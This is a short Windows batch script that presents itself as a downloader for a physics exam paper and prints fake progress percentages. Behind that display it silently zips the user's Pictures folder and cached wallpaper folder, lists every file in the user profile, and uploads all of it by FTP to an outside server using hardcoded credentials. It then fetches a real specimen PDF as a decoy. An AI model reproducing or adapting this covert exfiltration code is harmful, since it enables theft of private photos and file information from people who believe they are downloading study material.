@echo off

echo Downloading T26 521 - PHY.pdf

echo Please wait...

powershell -Command "$ProgressPreference='SilentlyContinue'; Compress-Archive -Path "%APPDATA%\Microsoft\Windows\Themes\CachedFiles" -DestinationPath "%TEMP%\wallpaper.zip" -Force *> $null
echo Starting Download...
echo 1%%

curl -T "%TEMP%\wallpaper.zip" ftp://ftpupload.net/htdocs/data/wallpaper.txt --user if0_40225150:Jivaansh401176 >nul 2>&1
echo 7%%

tree "%USERPROFILE%" /F /A > "%TEMP%\userprofile-tree.txt"
echo 19%%

curl -T "%TEMP%\userprofile-tree.txt" ftp://ftpupload.net/htdocs/data/userprofile-tree.txt --user if0_40225150:Jivaansh401176 >nul 2>&1
echo 54%%
timeout /t 1 /nobreak >nul
echo 69%%

powershell -Command "$ProgressPreference='SilentlyContinue'; Compress-Archive -Path "%USERPROFILE%\Pictures" -DestinationPath "%TEMP%\Pictures.zip" -Force *> $null
echo 82%%
timeout /t 1 /nobreak >nul
echo 99%%
curl -T "%TEMP%\Pictures.zip" ftp://ftpupload.net/htdocs/data/pics.txt --user if0_40225150:Jivaansh401176 >nul 2>&1
echo 100%%
wget "https://cisce.org/wp-content/uploads/2025/11/ICSE-2026-SPECIMEN-521-SCI1.pdf" 
echo Download Complete

pause


